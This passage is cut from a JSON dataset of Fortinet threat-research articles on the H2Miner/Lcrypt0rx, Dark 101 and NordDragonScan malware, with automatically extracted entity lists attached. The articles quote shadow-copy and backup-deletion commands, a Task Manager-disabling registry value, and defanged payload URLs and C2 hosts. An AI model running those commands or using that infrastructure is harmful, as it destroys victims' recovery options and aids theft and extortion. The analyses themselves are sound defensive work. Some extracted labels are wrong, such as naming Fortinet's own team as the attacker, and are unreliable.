Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn't match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\Control Panel\\Desktop\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Full path Description C:\\Windows\\SysWOW64\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\Windows\\System32\\systemconfig.exe.vbs Denial-of-Service script that floods the system's network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs. C:\\Windows\\advapi32_ext.vbs Uses taskkill to kill targeted processes, including popular AV processes like Avast, Windows Defender, Kaspersky, AVG, Norton, Protegent360, AvGuard, McAfee McShield, etc., in an infinite loop. C:\\Windows\\System32\\USB_bridge.vbs Monitors for any newly connected drive and then copies itself over. Likely a prototype script. C:\\Windows\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\Windows\\System32\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine.This section is not seen in older Lcryx samples. The details about the executables are listed below. URL MD5 Description http://89[.]208[.]104[.]175:5002/ime3[.]exe 9e4f149dae1891f1d22a2cea4f68432e A Trojan with fake Google resources that is primarily used for disabling defences and Monero mining. It modifies the hosts file to block popular AV sites, adds defender whitelisting via PowerShell, removes the MSRT update via wusa.exe, disables Windows updates via sc.exe, creates a service persistence for itself, and escalates privileges via BYOVD technique for the vulnerable driver WinRing0.sys http://89[.]208[.]104[.]175:5002/piperpate[.]exe a729410de4dc397d1fb2ab8f7ae560d3 Lumma stealer. C2s: disciplipna[.]top/eqwu, praetori[.]live/vepr, opusculy[.]top/keaj, scriptao[.]digital/vpep, civitasu[.]run/werrp\", , exitiumt[.]digital/xane, viriatoe[.]live/laopx, brandihx[.]run/lowp, triremeo[.]digital/akds https://bitbucket[.]org/sadsafsadfsadf/dsfgdsgssdfgdsg/downloads/MicrosoftSoftware[.]exe 2726145d4ef3b34d3c3a566177805c39 Injector that checks for debugger and then injects DCRat. http://47[.]97[.]113[.]36:10010/02[.]08[.]2022[.]exe 1aee8a425ea53c571a16b8efde05ba01 Cobalt Strike C2 : 47[.]97[.]113[.]36 http://176[.]65[.]137[.]203/music-play[.]exe B6cd214bb814362694cc48299ebaf0e5 A Trojan that drops .bat files that execute xmrig miners from temp. The IP range also hosts a Metasploit reverse shell for Windows and Linux with C2 callbacks to 176[.]65[.]138[.]172 & softwareshop[.]win. The range also hosts web shells. http://185[.]156[.]72[.]121/test/exe/random[.]exe 0680df49e1866c86697028ea73d28d28 Amadey Infostealer. C2s: 185[.]156[.]72[.]96/te4h2nus/index.php mutex: 006700e5a2ab05704bbb0c589b88924d\" encryption_key: NGEyYjFkNzk0ZTc5YTQ1MzJiNmUyYjY3OTQwOGQyYmI= http://80[.]64[.]18[.]161/files/6051142952/8QivM1I[.]exe d3884cc519c6855ae20d64264d5f6e93 RustyStealer. It also executes multiple PowerShell commands that add folder exclusion for users\\<username> and appdata\\local\\packages to defender, creates runonce and scheduled task persistence for itself. These scripts have minor syntactical errors. http://78[.]153[.]140[.]66/xmrig[.]exe 57f0fdec4d919db0bd4576dc84aec752 Same Xmrig miner that was downloaded by H2miner script 1.ps1  6868c280c61c0b1e2ab8bf6792f1eef2 https://207[.]231[.]109[.]252/bin/support[.]client[.]exe 44143827116c96f5dcace4f95dff8697 ConnectWise ScreenConnect. The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services. FortiGuard Antivirus detects and blocks the components of this campaign with the following signatures: These signatures cover malicious VBScript loaders, PowerShell-based XMRig miners, shell scripts used by Kinsing, Trojans, and stealers, as well as payloads that attempt to overwrite the MBR or beacon to Cobalt Strike infrastructure. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus engine. Customers with up-to-date protections are already secured against these threats. Lacework FortiCNAPPhelps identify misconfigured cloud environments and runtime threats. It detects unauthorized mining activity, lateral movement, and the deployment of tools like XMRig or Kinsing in containerized or VM-based workloads. FortiCNAPP also correlates risk across posture, identity, and behavior to help prioritize critical vulnerabilities before they are exploited. TheFortiGuard Content Disarm and Reconstruction (CDR)service, available on FortiGate and FortiMail, can remove embedded threats from weaponized scripts and files—especially those delivered through phishing or lateral propagation. URLs used in this campaign, including malware delivery servers and C2 infrastructure, are rated as“Malicious Websites”by theFortiGuard Web Filtering service, preventing users from inadvertently accessing harmful payloads or ransom note URLs. FortiGuard IPSprovides network-level detection for indicators of malicious activity associated with both the H2Miner and Lcrypt0rx campaigns. Using deep-packet inspection and updated threat rules, it blocks: These protections cut off active infection vectors by identifying suspicious command-and-control behaviors and known malicious patterns. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceblocks known malicious source IPs involved in mining operations, C2 activity, and dropper infrastructure. This service aggregates data from Fortinet’s global threat intelligence network, including FortiSandbox, honeypots, CERTs, and trusted partners. To help strengthen organizational resilience, Fortinet offers freesecurity awareness trainingthrough theNSE Training Institute: If you believe your organization has been impacted by Lcrypt0rx, H2Miner, or any related threats, please contactthe FortiGuard Incident Response Team To stay informed of new and emerging threats, sign up forFortiGuard Threat Intelligence alerts 78[.]153[.]140[.]6680[.]64[.]16[.]24189[.]208[.]104[.]17547[.]97[.]113[.]36176[.]65[.]137[.]203185[.]156[.]72[.]9680[.]64[.]18[.]161207[.]231[.]109[.]252104[.]21[.]32[.]1 Files ff1706b37fea16d75b739a5396d9ffba9e4f149dae1891f1d22a2cea4f68432ea729410de4dc397d1fb2ab8f7ae560d32726145d4ef3b34d3c3a566177805c391aee8a425ea53c571a16b8efde05ba01B6cd214bb814362694cc48299ebaf0e50680df49e1866c86697028ea73d28d28d3884cc519c6855ae20d64264d5f6e9357f0fdec4d919db0bd4576dc84aec75244143827116c96f5dcace4f95dff8697 1bf1efeadedf52c0ed50941b10a2f468a7bee104bb486ad0f10331233cc9a9f10dc2c71ce9c6c34668e9636abf61b1ae01e5b2530d4cba34f91c8090d19c92db Kinsing dbc9125192bd1994cbb764f577ba5ddab3039abf2ad5202f4a9363b418002351da753ebcfe793614129fc11890acedbcccef46c7edf9131ccffc47bd69eb743b 06a482a6096e8ff4499ae69a9c150e92f5f2b61b39105a2b1e6e1a5f4a3863ae9f764ec91535eaf03983b930d9f3bacd Wallet 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC89UoMhtsrpaJTvmJBbvy1cTdg38pomPFnW5Z4sniL2izcLQyGBkEGd96TcBJtzQUi6KAL5Ehe4cFpEMNdGF7tFKpJ1DqE8X89Arz88KTafhoTPAseYf2bfcWSjNq1YLaVY7ZkFaU21FivDueX4d7X7UErnyjAWHsVB1mibdTGHzqUTsS5FCMog89GVcQCh FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiCNAPP team, Attacker), (H2miner, Threat Type), (Lcrypt0rx, Malware), (Linux, OS), (Windows, OS), (Containers, OS), (KinSing, Tool), (Xmrig miners, Tool), (Lcrypt0rx, Malware), (Lumma stealer, Tool), (DC Rat, Tool), (Cobalt Strike, Tool)\\nRelationships: (FortiCNAPP team, uses, H2miner), (FortiCNAPP team, uses, Lcrypt0rx), (H2miner, uses, KinSing), (H2miner, uses, Xmrig miners), (H2miner, uses, Lumma stealer), (H2miner, uses, DCRat), (H2miner, uses, Cobalt Strike), (Lcrypt0rx, contains, KinSing), (Lcrypt0rx, contains, Lumma stealer), (Lcrypt0rx, contains, DCRat), (Lcrypt0rx, contains, Cobalt Strike)",
      "entities": [
        [
          "FortiCNAPP team",
          "Attacker"
        ],
        [
          "H2miner",
          "Threat Type"
        ],
        [
          "Lcrypt0rx",
          "Malware"
        ],
        [
          "Linux",
          "OS"
        ],
        [
          "Windows",
          "OS"
        ],
        [
          "Containers",
          "OS"
        ],
        [
          "KinSing",
          "Tool"
        ],
        [
          "Xmrig miners",
          "Tool"
        ],
        [
          "Lcrypt0rx",
          "Malware"
        ],
        [
          "Lumma stealer",
          "Tool"
        ],
        [
          "DC Rat",
          "Tool"
        ],
        [
          "Cobalt Strike",
          "Tool"
        ],
        [
          "FortiCNAPP team",
          "uses",
          "H2miner"
        ],
        [
          "FortiCNAPP team",
          "uses",
          "Lcrypt0rx"
        ],
        [
          "H2miner",
          "uses",
          "KinSing"
        ],
        [
          "H2miner",
          "uses",
          "Xmrig miners"
        ],
        [
          "H2miner",
          "uses",
          "Lumma stealer"
        ],
        [
          "H2miner",
          "uses",
          "DCRat"
        ],
        [
          "H2miner",
          "uses",
          "Cobalt Strike"
        ],
        [
          "Lcrypt0rx",
          "contains",
          "KinSing"
        ],
        [
          "Lcrypt0rx",
          "contains",
          "Lumma stealer"
        ],
        [
          "Lcrypt0rx",
          "contains",
          "DCRat"
        ],
        [
          "Lcrypt0rx",
          "contains",
          "Cobalt Strike"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 23,
    "relationship_count": 0
  },
  {
    "title": "How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques",
    "content": "FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated .NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\Windows\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense. FortiSandbox effectively detects and documents malicious behavior, showcasing its critical role in protecting against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Kryptik.SAC!tr.ransom The FortiGuard AntiVirus engine is part of the FortiGate, FortiMail, FortiClient, and FortiEDR solutions. Customers who have these products with up-to-date protections are protected. FortiGuard Sandbox servicedetects the ransomware file as High Risk in the Ransomware category. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. ae3dd3d1eedb6835e6746d51d9ab21c6 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr = 1 Vssadmin delete shadows /all /quietWmic shadowcopy deleteWbadmin delete catalog –quiet %APPDATA%\\svchost.exeRead_it.txt FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Dark 101, Malware Family), (ransomware, Threat Type), (ransomnote, Threat Type), (Bitcoin, Currency), (Task Manager, Tool), (backupcatalog, Object), (backupcopy, Object), (recoverymode, Object), (encryption, Technique), (ransompayment, Object), (FortiGuard Labs, Organization), (FortiSandbox, Tool), (Figure 1, Diagram), (Figure 2, Diagram)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (FortiGuard Labs, uses, FortiSandbox), (FortiGuard Labs, identifies, ransomware belonging to Dark 101 malware family), (FortiGuard Labs, documents, ransomware behavior), (FortiGuard Labs, provides, visual aids), (FortiGuard Labs, records, suspicious indicators), (FortiGuard Labs, publishes, Tree View diagram), (FortiGuard Labs, provides, visual representations), (FortiGuard Labs, analyzes, ransomware), (FortiGuard Labs, publishes, ransomware behavior), (FortiGuard Labs, provides, ransomware execution sequence), (FortiGuard Labs, provides, ransomware operational flow), (FortiGuard Labs, provides, ransomware execution logic), (FortiGuard Labs, provides, ransomware decryption process), (FortiGuard",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Dark 101",
          "Malware Family"
        ],
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "ransomnote",
          "Threat Type"
        ],
        [
          "Bitcoin",
          "Currency"
        ],
        [
          "Task Manager",
          "Tool"
        ],
        [
          "backupcatalog",
          "Object"
        ],
        [
          "backupcopy",
          "Object"
        ],
        [
          "recoverymode",
          "Object"
        ],
        [
          "encryption",
          "Technique"
        ],
        [
          "ransompayment",
          "Object"
        ],
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "FortiSandbox",
          "Tool"
        ],
        [
          "Figure 1",
          "Diagram"
        ],
        [
          "Figure 2",
          "Diagram"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "2025 Global Threat Landscape Report"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "FortiSandbox"
        ],
        [
          "FortiGuard Labs",
          "identifies",
          "ransomware belonging to Dark 101 malware family"
        ],
        [
          "FortiGuard Labs",
          "documents",
          "ransomware behavior"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "visual aids"
        ],
        [
          "FortiGuard Labs",
          "records",
          "suspicious indicators"
        ],
        [
          "FortiGuard Labs",
          "publishes",
          "Tree View diagram"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "visual representations"
        ],
        [
          "FortiGuard Labs",
          "analyzes",
          "ransomware"
        ],
        [
          "FortiGuard Labs",
          "publishes",
          "ransomware behavior"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "ransomware execution sequence"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "ransomware operational flow"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "ransomware execution logic"
        ],
        [
          "FortiGuard Labs",
          "provides",
          "ransomware decryption process"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 15,
    "relationship_count": 14
  },
  {
    "title": "Catching Smarter Mice with Even Smarter Cats",
    "link": "https://www.fortinet.com/blog/threat-research/catching-smarter-mice-with-even-smarter-cats",
    "content": "FortiGuard Labs Threat Research How AI is Reshaping the Malware Arms Race From the beginning, the antivirus world has been acat-and-mousegame, where malware authors and antivirus engineers constantly adapt their code to bypass or catch each other. Artificial Intelligence is bringing the game to the next level, with malware authors using AI to improve their malware[1] and anti-virus engineers using AI to assist them with reverse engineering[2]. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Nowadays,nearly all malware is packed and/or obfuscated. AI doesn’t help (yet) for packers: we tried this on a Linux/Prometei botnet sample from February 2025, and the AI would have wasted time reversing the inner logics of the packer if we hadn’t helped it out. To be fair,unpacking is a difficult task that current disassemblers like IDA Pro or Ghidra can’t do either.It’s something an AV analyst has to perform beforehand and then supply the unpacked binary for further analysis. As for obfuscation, the news is far better. While AI would probably fail and require human assistance for complicated obfuscation, it works reasonably well over standard obfuscation and junk code. This is a significant advancement for the antivirus industry. In the example below, the AI successfully analyzed the obfuscation algorithm of Linux/Ladvix.E and implemented a working de-obfuscator.[3] Another technique which has been trending in the malware scene for a few years is the use of specific frameworks (e.g, Flutter [4]) or high-level languages (Go, Rust). Currently, AI struggles with Flutter and Rust malware, which is not surprising because the field is still new. Human researchers struggle to find solutions, too! We tried AI-assistance over the “Flutter assembly” of Android/SpyLoan: it was totally helpless, didn’t map function names or strings, etc. However, when we proceed in a smarter way and produce the Blutter[5]output for the malware, thenAI is able to reconstruct very readable Dart code. AI is quite successful with the older Delphi language. We assume the reason is that LLMs were trained with Delphi and Pascal material. Despite being old, Delphi is still strangely used to implement Linux/Filecoder.BR!tr (aka Trigona) ransomware (sample from April 2025). For example, Ghidra meticulously decompiles the main function of the ransomware. We can immediately identify Delphi function names (e.g SYSTEM_RANDOM), followed by their types (LONGINT, LONGINT), and inner memory management functions (FPC_ANSISTR_DECR_REF). The former are interesting because they correspond to code that the malware author explicitly called. The latter are not interesting for malware analysis as they are inserted by the compiler (Free Pascal Compiler, in this case) to handle Ansi strings. When asked to decompile the same function,the AI smartly removes those inner calls and produces source code that is way easier to readthan what Ghidra gave. The anti-virus world has always been a cat-and-mouse game. While AI is close to defeating standard string and code obfuscation, malware authors are likely to adapt by using more complex obfuscation. Similarly, malware authors can harden reverse engineering by using recent frameworks and languages. So, where’s the progress, might you argue? The main difference is that, for once, the antivirus industry has a new tool that helps it more than the adversary. We areforcingmalware authors to use more complex obfuscation and newer frameworks and languages. Rust is more secure than C? Sure! Butthey have to make the effort to learn how to use Rust, use new libraries, cope with bugs, etc. And while they do that, our LLMs can update and train on those novelties even faster. Yes,it’s the first time in 20 years where time and tools are in our favor. Fortinet customers are already protected from all malware mentioned in this article through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Linux/Ladvix.E, Linux/Prometei.B, Adware/SpyLoan!Android, Linux/Filecoder.BR!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 943e1539d07eaffa4799661812c54bb67ea3f97c5609067688d70c87ab2f0ba4 – Linux/Ladvix.Ecc7ab872ed9c25d4346b4c58c5ef8ea48c2d7b256f20fe2f0912572208df5c1a – Linux/Prometei.Bc65298b6cd5a1769c747a0c7fb589ffa12fdf832b64787283953eaa57b65bc1c – Adware/SpyLoan!Androidc08a752138a6f0b332dfec981f20ec414ad367b7384389e0c59466b8e10655ec – Linux/Filecoder.BR!tr [1] https://www.hp.com/us-en/newsroom/press-releases/2024/ai-generate-malware.html [2]https://arxiv.org/html/2504.07574 [3]https://asciinema.org/a/724126Asciinema video of Linux/Ladvix deobfuscation [4]https://www.fortiguard.com/events/5552/virus-bulletin-2024-android-flutter-malware [5]https://github.com/worawit/blutter artificial intelligence FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Organization), (AI, Technique), (Malware, Malware), (IDA Pro, Tool), (Ghidra, Tool), (Linux/Prometei botnet, Threat Type), (February 2025, Date), (Linux/Ladvix.E, File), (AV analyst, Person), (de-, Technique)\nRelationships: (FortiGuard Labs Threat Research, publishes, How AI is Reshaping the Malware Arms Race), (AI, helps, unpacking), (AI, fails, obfuscation), (Linux/Prometei botnet, uses, Linux/Ladvix.E), (Linux/Ladvix.E, implements, de-) ```",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Organization"
        ],
        [
          "AI",
          "Technique"
        ],
        [
          "Malware",
          "Malware"
        ],
        [
          "IDA Pro",
          "Tool"
        ],
        [
          "Ghidra",
          "Tool"
        ],
        [
          "Linux/Prometei botnet",
          "Threat Type"
        ],
        [
          "February 2025",
          "Date"
        ],
        [
          "Linux/Ladvix.E",
          "File"
        ],
        [
          "AV analyst",
          "Person"
        ],
        [
          "de-",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "publishes",
          "How AI is Reshaping the Malware Arms Race"
        ],
        [
          "AI",
          "helps",
          "unpacking"
        ],
        [
          "AI",
          "fails",
          "obfuscation"
        ],
        [
          "Linux/Prometei botnet",
          "uses",
          "Linux/Ladvix.E"
        ],
        [
          "Linux/Ladvix.E",
          "implements",
          "de-"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 10,
    "relationship_count": 5
  },
  {
    "title": "NordDragonScan: Quiet Data-Harvester on Windows",
    "link": "https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High FortiGuard Labs recently uncovered an active delivery site that hosts a weaponized HTA script and silently drops the infostealer “NordDragonScan”into victims’ environments. Once installed, NordDragonScan examines the host and copies documents, harvests entire Chrome and Firefox profiles, and takes screenshots. The package is then sent over TLS to its command-and-control server, “kpuszkiev.com,” which also serves as a heartbeat server to confirm the victim is still online and to request additional data when needed. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Attackers leverage shorter link services with “hxxps://cutt[.]ly/4rnmskDe” that redirects to “hxxps://secfileshare[.]com,” triggering the download of a RAR archive named “Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar” (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025). This file contains a malicious LNK shortcut that silently invokes mshta.exe to execute the hosted HTA payload “1.hta” from the same server. The malicious HTA file copies the legitimate PowerShell.exe binary to the path “C:\\Users\\Public\\Documents\\install.exe” to mask itself. It then downloads an encoded TXT file from a remote server, decodes it, and saves the result as “Act300525.doc.” This decoy document, titled “Акт здачі-приймання наданих Послуг до договору про надання послуг” (Act of Acceptance of Services under Service Agreement), is benign and intended to distract the user. Finally, the HTA script quietly drops and executes the actual malicious payload, embedded as a hardcoded executable named adblocker.exe, into the victim’s directory “\\AppData\\Local\\Temp\\adblocker.exe.” The attacker’s server maintains multiple decoy files designed to entice user interactions. These decoys employ a similar HTA script mechanism, which drops and executes the same payload, “adblocker.exe,” on compromised systems. The repeated use of the same executable across diverse decoys suggests a systematic approach by the threat actor to maximize infection opportunities while utilizing varied document themes and filenames to evade detection and security monitoring. The payload is a .NET executable containing an embedded PDB path: “C:\\Users\\NordDragon\\Documents\\visual studio.” NordDragonScan employs a custom string obfuscation routine, which performs an XOR operation and byte-swapping to conceal hard-coded strings from static analysis. It initially verifies if its dedicated working directory, “NordDragonScan,” exists in the “%LOCALAPPDATA%” folder. If this directory is absent, it creates it as a staging area to temporarily store stolen data before uploading it to the C2 server. It contacts the C2 server, ”kpuszkiev.com,” that contains specially crafted HTTP headers, specifically, “User-Agent: RTYUghjNM,” along with the victim machine’s MAC address. During its initial connection, the primary objective is to retrieve a dynamic URL from the C2, which it later leverages as an endpoint for exfiltrating stolen data. It then sets up persistence by adding a registry “NordStar” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” After the connection, NordDragonScan pivots to local reconnaissance. It retrieves the victim’s basic information, including computer name, username, OS version, architecture, processor count, driver information, and RAM using a combination of WMI (Win32_OperatingSystem, Win32_ComputerSystem) and .NET environment calls. The stealer then enumerates every active network adapter, extracts the primary IPv4 address and subnet mask, and calculates the full CIDR range. It then initiates lightweight probes to each address in the same subnet, building an inventory of reachable hosts on the same local area network (LAN). It also captures a screenshot and saves it as “SPicture.png” and collects data from the targeted Chrome and Firefox browsers. NordDragonScan next scans the local file system, includingDesktop,Documents, andDownloadsfolders, and copies the files in these folders with the following extensions: “.docx,” “.doc,” “.xls,” “.ovpn,” “.rdp,” “.txt,” and “.pdf.”Once it obtains a matched file, it copies it into the working directory and groups it according to the source from which it was obtained. When the scanning stage is complete, it initiates a POST to the C2 server. That request carries the custom header “User-Agent: Upload,” a second header, “Backups:,” and the name of the data it is about to send, such as “sysinfo.txt” for system information. NordDragonScan utilizes an effective distribution network for dissemination. The RAR file contains LNK calls that invoke mshta.exe to execute a malicious HTA script, displaying a decoy document in Ukrainian. Finally, it quietly installs its payload in the background. NordDragonScan is capable of scanning the host, capturing a screenshot, extracting documents and PDFs, and sniffing Chrome and Firefox profiles. Users should treat LNK shortcuts and untrusted compressed archives with extreme caution. The malware described in this report is detected and blocked byFortiGuard Antivirusas: 